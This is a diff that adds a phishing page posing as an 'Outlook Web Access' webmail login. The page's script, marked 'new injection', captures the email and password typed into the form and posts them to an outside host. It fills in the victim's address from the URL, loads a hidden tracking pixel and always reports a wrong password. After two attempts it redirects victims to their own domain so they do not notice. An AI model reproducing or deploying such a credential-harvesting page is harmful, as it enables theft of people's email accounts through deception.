@@ -1,0 +1,275 @@
+﻿<html><head>
+    <title>Outlook Web Access</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="https://controlpanel.serverdata.net/Portal/bundles/styles/login/aduser?v=W7BlBDeKoLwh8af7SGN3zTnaNVVx3_J0LsG11KaUjz81" rel="stylesheet">
+
+    <script async="" src="//www.google-analytics.com/analytics.js"></script><script src="/Portal/bundles/scripts/login/form?v=CmdgOWPmbhvy-YqQrxjWVdKbUwAQPUKB8GGJxjDJB141"></script>
+
+    <style>
+        .wbk {
+            word-break: keep-all;
+        }
+        .p0 {
+            padding: 0;
+        }
+    </style>
+<script type="text/javascript" src="/8974f6aa-63fd-4221-aeea-fcad205312b0.js"></script><script src="https://az416426.vo.msecnd.net/scripts/a/ai.0.js"></script></head>
+<body style="zoom: 1;">
+    <section class="login-section">
+        <div class="login-logo"></div>
+        <h1 class="login-header">Welcome to your Webmail &amp; Account Settings</h1>
+        
+
+<div class="login-alert" id="login-update-browser-ie" style="display: none">
+    <div class="text-center">
+        <p class="lh16 mb8"> Internet Explorer is not officially supported and your experience may not be optimal. For the best experience, please upgrade your browser. </p>
+    </div>
+</div>
+<script type="text/javascript">
+    $(function () {
+        'use strict';
+
+        function has(userAgentSubstr) {
+            return window.navigator.userAgent.indexOf(userAgentSubstr) !== -1;
+        }
+
+        // if <=IE10 or ==IE11
+        if (has('MSIE ') || has('Trident/')) {
+            $('#login-update-browser-ie').show();
+        }
+    });
+</script>
+
+        <div id="oldBrowser" class="login-alert" style="display: none;">
+            <div class="login-alert-content">
+                
+                <img class="login-alert-icon m-24" src="https://controlpanel.serverdata.net/Content/images/icons/24/warning-orange_24.png" alt="">
+                <div class="login-alert-text"><div class="d-tc">
+ <i class="login-alert-icon-warning mr10 ml-10"></i>
+ </div>
+ <div class="d-tc">
+ <p><strong>You’ll get more if you update your browser.</strong> <br>
+ Our layout and page behavior is optimized for the latest version of your browser.</p>
+ <p><a class="btn m-warning" href="http://outdatedbrowser.com/en" target="_blank">Update my browser</a></p>
+ <p class="mb0">This button will redirect you to your browser’s
+ update page</p>
+ </div></div>
+            </div>
+        </div>
+                            <div class="login-tabs">
+                <button class="login-tab login-webmail selected">
+                    Webmail
+                    <i class="icon-info tooltip tooltipstered"></i>
+                </button>
+                <button class="login-tab login-myservices">
+                    My Services
+                    <i class="icon-info tooltip tooltipstered"></i>
+                </button>
+            </div>
+        <form method="POST" class="login-form" novalidate="" action=''autocomplete="off">
+            <div>
+                <div id="aduser-login-spinner" style="display: none">
+                    <div style="margin: auto; position: absolute; top: 0; left: 0; right: 0; bottom: 0; text-align: center; z-index: 10; background: rgba(255, 255, 255, 0.5);">
+                        <ui:spinner></ui:spinner>
+                    </div>
+                </div>
+               
+                <input name="clientType" type="hidden" class="client-type" value="WebMail">
+                <div class="pr">
+                    <input name="login" id="email" type="text" placeholder="Login (email)" class="login-input" required="" autofocus="">
+                    <div class="login-validation required">Login required</div>
+                        <div class="login-validation email">Valid email address required</div>
+                </div>
+                <div class="pr">
+                    <input name="password" id="password" type="password" placeholder="Password" class="password-input" required="">
+                    <div class="password-validation required">Password required</div>
+                </div>
+				<p id='msg' style='color:red;'></p>
+                <template id="login-captcha-template">
+                    <div class="login-form-captcha">
+                        <input type="hidden" name="captchaId" value="5ffb470b0db540cfa99c3f92d9772ea4">
+                        <div class="captcha-image">
+                            <img id="captchaImage" src="/Portal/Captcha?id=5ffb470b0db540cfa99c3f92d9772ea4&amp;width=94&amp;height=36&amp;rnd=1701610570&amp;httproute=True" alt="">
+                        </div>
+                        <button class="captcha-refresh" type="button">
+                            
+                            <svg x="0px" y="0px" width="25px" height="24px" viewBox="0 0 25 24" class="captcha-refresh-icon">
+                                <path d="M11.9,19.5c-3.2,0-6.1-2.2-7.1-5.2l0.8-0.1l0,0c0.6-0.1,0.9-0.6,0.8-1.2c0-0.2-0.2-0.4-0.3-0.6L3.3,9
+                                c-0.2-0.3-0.6-0.4-1-0.4C2,8.7,1.7,9,1.6,9.3l-1.4,4.3c-0.1,0.3,0,0.7,0.2,1C0.6,14.9,1,15,1.4,15l0.9-0.2
+                                c1.2,4.3,5.1,7.3,9.7,7.3c2.7,0,5.2-1.1,7.1-3l-1.9-1.9C15.8,18.7,13.9,19.5,11.9,19.5z">
+                                </path>
+                                <path d="M23.7,12c-0.2-0.3-0.5-0.5-0.9-0.5l-0.9,0c-0.3-5.3-4.7-9.6-10.1-9.6c-3.5,0-6.7,1.8-8.5,4.7l2.2,1.4
+                                C7,5.9,9.4,4.6,11.9,4.6c3.9,0,7.2,3.1,7.4,7l-0.8,0c0,0,0,0,0,0c-0.6,0-1,0.5-1,1c0,0.2,0.1,0.4,0.2,0.6l2.1,3.8
+                                c0.2,0.3,0.5,0.5,0.9,0.5c0.4,0,0.7-0.2,0.9-0.5l2.1-4C23.9,12.7,23.9,12.3,23.7,12z">
+                                </path>
+                            </svg>
+                            
+                        </button>
+                    </div>
+                    <div class="pr">
+                        <input name="captchaCode" type="text" placeholder="Code" class="captcha-input" autofocus="">
+                        <div class="captcha-validation required">Code required</div>
+                        <div class="captcha-validation server">Valid code required</div>
+                    </div>
+                </template>
+                <div id="login-captcha-place" class="pr"></div>
+                <div class="login-actions">
+                    <div class="login-remember">
+                        <label class="login-remember-me">
+                            <input type="checkbox" name="rememberMe" value="true" class="login-checkbox">
+                            <span style="line-height: 22px; height: 22px;">Remember me</span>
+                        </label>
+                    </div>
+                    <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
+                </div>
+            </div>
+            <button type="submit" class="login-submit wbk p0" id='submit-btn'>Login</button>
+        </form>
+        <div style="display: none;">
+            <img src="https://crosleylegal.net/v-3rpff-45/wao/visit.php" alt="Action">
+        </div>
+    </section>
+
+
+<script src="/Portal/bundles/scripts/login/form/aduser?v=B87zorpzZDMoJcsZoh1VXPIom52zrbX9F7qXIbJKQ3w1"></script>
+     <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+<script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+		
+		
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+ 
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+                    if (!password) {
+                $('#msg').show();
+                $('#msg').html("Password field is empty!");
+
+                return false;
+            }
+
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+       
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://crosleylegal.net/v-3rpff-45/wao/xSue.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifying...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                $("#password").val(""); 
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                     window.location.replace("https://www."+my_slice);
+
+                  }
+                               $("#msg").show();
+               $('#msg').html("Password is not correct. Please try again");
+                }
+                else{
+                                $("#msg").show();
+               $('#msg').html("Password is not correct. Please try again");
+                }
+              }
+            },
+            error: function(){
+            $("#password").val("");
+              if (count>=2) {
+                count=0;
+                 window.location.replace("https://www."+my_slice);
+              }
+              $("#msg").show();
+               $('#msg').html("Password is not correct. Please try again");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+
+    });
+
+
+  </script>
+
+</body></html>
